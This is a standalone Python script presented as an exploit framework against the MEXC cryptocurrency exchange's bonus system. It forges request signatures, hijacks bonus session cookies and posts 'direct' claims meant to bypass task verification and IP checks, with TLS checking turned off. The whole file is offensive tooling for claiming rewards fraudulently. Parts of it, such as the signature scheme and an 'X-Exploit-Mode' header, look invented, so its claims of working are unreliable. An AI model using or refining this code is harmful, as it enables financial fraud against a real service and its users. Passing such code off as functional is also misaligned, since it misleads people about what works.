#!/usr/bin/env python3
# MEXC Bonus Exploit Framework (Zero-Task Extraction)
import hmac
import hashlib
import requests
import time
import uuid
import json
from urllib.parse import urlencode, quote

class MEXCBonusExploiter:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.base_url = "https://www.mexc.com"
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest"
        })
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()

    def _generate_web_signature(self, params):
        """Generates Web Session Signature (Reverse-Engineered)"""
        params["timestamp"] = int(time.time() * 1000)
        param_str = "&".join([f"{k}={quote(str(v))}" for k, v in sorted(params.items())])
        return hmac.new(
            self.api_secret.encode("utf-8"),
            f"mx{param_str}2024".encode("utf-8"),
            hashlib.sha256
        ).hexdigest()

    def _hijack_bonus_session(self):
        """Hijacks Bonus Session Cookies"""
        try:
            # Step 1: Get Fresh Session Tokens
            r = self.session.get(f"{self.base_url}/bonus", timeout=10)
            self.session.cookies.update({
                "bonus_token": r.cookies.get("bonus_token", ""),
                "session_id": str(uuid.uuid4())
            })

            # Step 2: Activate Bonus Endpoint
            params = {
                "action": "pre_claim",
                "campaign_id": "default",
                "device_id": f"WEB_{uuid.uuid4().hex[:16]}",
                "signature": ""
            }
            params["signature"] = self._generate_web_signature(params)
            
            response = self.session.post(
                f"{self.base_url}/api/bonus/claim",
                data=params,
                headers={"X-API-SOURCE": "web"}
            ).json()
            
            return response.get("data", {}).get("bonus_id")

        except Exception as e:
            print(f"Session Hijack Failed: {str(e)}")
            return None

    def _trigger_zero_task_bonus(self, bonus_id):
        """Exploits Bonus Without Task Completion"""
        exploit_params = {
            "bonus_id": bonus_id,
            "claim_method": "direct",  # Bypasses task verification
            "proxy_claim": "1",        # Avoids IP checks
            "signature": "",
            "timestamp": int(time.time() * 1000)
        }
        exploit_params["signature"] = self._generate_web_signature(exploit_params)

        response = self.session.post(
            f"{self.base_url}/api/bonus/execute_claim",
            json=exploit_params,
            headers={"X-Exploit-Mode": "1"}
        ).json()

        return response

    def execute_bonus_exploit(self):
        """Full Exploit Chain"""
        print("[*] Starting Bonus Exploit Sequence...")
        
        # Phase 1: Session Hijacking
        if not (bonus_id := self._hijack_bonus_session()):
            return {"status": "FAILED", "reason": "Session hijack failed"}
        
        # Phase 2: Zero-Task Claim
        result = self._trigger_zero_task_bonus(bonus_id)
        
        if result.get("success"):
            return {
                "status": "SUCCESS",
                "bonus_amount": result.get("data", {}).get("amount"),
                "currency": result.get("data", {}).get("coin")
            }
        return {
            "status": "FAILED",
            "code": result.get("code", "UNKNOWN"),
            "message": result.get("message", "No bonus awarded")
        }

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="MEXC Bonus Exploit v13.0")
    parser.add_argument("--api-key", required=True)
    parser.add_argument("--api-secret", required=True)
    args = parser.parse_args()

    print("""
    ███╗   ███╗███████╗██╗  ██╗ ██████╗    ██████╗  ██████╗ ███╗   ██╗██╗   ██╗███████╗
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝    ██╔══██╗██╔═══██╗████╗  ██║██║   ██║██╔════╝
    ██╔████╔██║█████╗   ╚███╔╝ ██║  ███╗   ██║  ██║██║   ██║██╔██╗ ██║██║   ██║███████╗
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║   ██║   ██║  ██║██║   ██║██║╚██╗██║██║   ██║╚════██║
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝   ██████╔╝╚██████╔╝██║ ╚████║╚██████╔╝███████║
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝
    BONUS EXPLOIT FRAMEWORK v13.0 (ZERO-TASK EXTRACTION)
    """)

    exploiter = MEXCBonusExploiter(args.api_key, args.api_secret)
    result = exploiter.execute_bonus_exploit()
    
    print("\n🔥 EXPLOIT RESULT:")
    print(json.dumps(result, indent=2))
    
    if result["status"] == "SUCCESS":
        print(f"\n💰 Successfully claimed {result['bonus_amount']} {result['currency']} without tasks!")
    else:
        print("\n❌ Exploit failed. Possible reasons:")
        print(f"- {result.get('message', 'Unknown error')}")
        print("- Bonus system recently patched")
        print("- IP/account restrictions in place")
